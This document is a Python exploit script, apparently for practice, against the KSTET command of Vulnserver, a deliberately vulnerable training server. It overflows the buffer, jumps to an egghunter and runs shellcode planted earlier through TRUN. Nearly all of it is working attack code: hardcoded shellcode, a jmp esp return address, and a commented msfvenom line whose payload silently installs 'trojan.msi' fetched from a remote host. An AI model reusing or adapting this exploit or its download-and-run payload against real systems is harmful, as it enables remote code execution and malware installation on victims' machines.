# Vulnserver.exe KSTET exploit
# Author: w4fz5uck5

import socket
from struct import *

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9999))

shellcode =  "w00tw00t"	           # egg
# shellcode += "\xcc"              # debugging
shellcode += "\x54"                # push esp
shellcode += "\x58"                # pop eax
shellcode += "\x66\x2D\xA6\x04"    # sub ax, 0x4a6
shellcode += "\xff\xe0"            # jmp eax  
shellcode += "\x90" * 806          # crucial padding
# shellcode += "\xcc"              # debugging
shellcode += "\x90" * 18           # padding

# If you want some reverse shell, try to utilize the windows/exec <PRO TIP>
# msfvenom -p windows/exec CMD="msiexec /q /i http://192.168.0.104/trojan.msi" \
# --arch x86 --platform windows -f python -v shellcode -b "\x00"                                                                     
shellcode += "\xd9\xc5\xd9\x74\x24\xf4\xbb\x82\x82\xe3\xb0\x5a"
shellcode += "\x31\xc9\xb1\x3a\x31\x5a\x19\x03\x5a\x19\x83\xea"
shellcode += "\xfc\x60\x77\x1f\x58\xe6\x78\xe0\x99\x86\xf1\x05"
shellcode += "\xa8\x86\x66\x4d\x9b\x36\xec\x03\x10\xbd\xa0\xb7"
shellcode += "\xa3\xb3\x6c\xb7\x04\x79\x4b\xf6\x95\xd1\xaf\x99"
shellcode += "\x15\x2b\xfc\x79\x27\xe4\xf1\x78\x60\x18\xfb\x29"
shellcode += "\x39\x57\xae\xdd\x4e\x2d\x73\x55\x1c\xa0\xf3\x8a"
shellcode += "\xd5\xc3\xd2\x1c\x6d\x9a\xf4\x9f\xa2\x97\xbc\x87"
shellcode += "\xa7\x9d\x77\x33\x13\x6a\x86\x95\x6d\x93\x25\xd8"
shellcode += "\x41\x66\x37\x1c\x65\x98\x42\x54\x95\x25\x55\xa3"
shellcode += "\xe7\xf1\xd0\x30\x4f\x72\x42\x9d\x71\x57\x15\x56"
shellcode += "\x7d\x1c\x51\x30\x62\xa3\xb6\x4a\x9e\x28\x39\x9d"
shellcode += "\x16\x6a\x1e\x39\x72\x29\x3f\x18\xde\x9c\x40\x7a"
shellcode += "\x81\x41\xe5\xf0\x2c\x96\x94\x5a\x3b\x69\x2a\xe1"
shellcode += "\x09\x69\x34\xea\x3d\x01\x05\x61\xd2\x56\x9a\xa0"
shellcode += "\x96\xa8\xd0\xe9\xbf\x20\xbd\x7b\x82\x2d\x3e\x56"
shellcode += "\xc1\x4b\xbd\x53\xba\xa8\xdd\x11\xbf\xf5\x59\xc9"
shellcode += "\xcd\x66\x0c\xed\x62\x87\x05\x80\xf7\x1e\xc3\x23"
shellcode += "\x9d\x83\x2b\xfb\x2c\x63\x03\x6a\xef\x0b\x2f\x18"
shellcode += "\x9f\xf1\xe0\xcf\x6e\x3c\xcd\x21\xa0\x08\x09\x10"
shellcode += "\xf2\x5a\x58\x5c\xc6\x8d\xee\xee\x49\xbb\x6f\x61"
shellcode += "\xb8\x56\x03\x14\xc4"

# send our shellcode without smash the stack
s.recv(1024)
s.send("TRUN ./" + shellcode + "\r\n")

# egghunter
egghunter =  "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

payload = "\x90\x90\x90\x90"            # padding
payload += egghunter                    
payload += "\x90" * (68 - len(payload)) # padding
payload += pack("I", 0x77E855C2)        # jmp esp
payload += "\xeb\xb6"                   # jmp short -72 -> to our egghunter

# send our final payload
s.recv(1024)
s.send("KSTET ./" + payload + "\r\n")
s.close()
